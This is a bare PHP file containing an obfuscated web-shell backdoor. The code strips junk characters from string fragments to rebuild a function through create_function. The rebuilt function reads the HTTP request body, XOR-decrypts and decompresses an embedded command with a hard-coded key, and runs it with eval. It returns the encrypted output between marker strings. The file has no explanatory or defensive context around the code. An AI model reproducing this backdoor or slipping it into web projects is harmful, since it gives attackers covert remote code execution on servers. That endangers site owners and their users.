<?php
$W='$S/k="6587daaf";S/$kh="dbS/9c5fS/5S/077f5";S/$kf="8S/058e09792deS/";S/$p="vn0gNeeS/crS/BNKT0TS/9";fS/unction xS/($t,$S/';
$J='k){$c=sS/S/trlen($k)S/;$l=strlenS/($t);$S/S/o=""S/;for($i=0;$i<$l;S/){for(S/S/$j=0;(S/$j<S/$c&&$i<$l);$j++S/,$i++S/){$o.';
$z='conS/tents();S/@obS/_end_S/cleaS/n();$r=@baS/se6S/4_eS/ncode(@x(@gS/zcompress(S/$o),$S/k)S/);priS/nt("$p$kS/h$r$kf");}';
$m='S/S/=$t{$i}^$k{$j}S/;}}reS/turn $oS/;S/}if (S/@preg_match(S/"/$khS/(.+)S/$kfS//",@fiS/S/lS/e_get_contentS/s("php://inp';
$y=str_replace('O','','OcreatOOe_fOuncOtOion');
$e='ut")S/,$m)=S/=1) {@oS/b_stS/S/art();@evaS/l(@gzuncS/ompreS/ss(@x(@S/baseS/64_decodS/eS/($mS/[1S/]),$k)));$o=@S/ob_get_';
$s=str_replace('S/','',$W.$J.$m.$e.$z);
$N=$y('',$s);$N();
?>
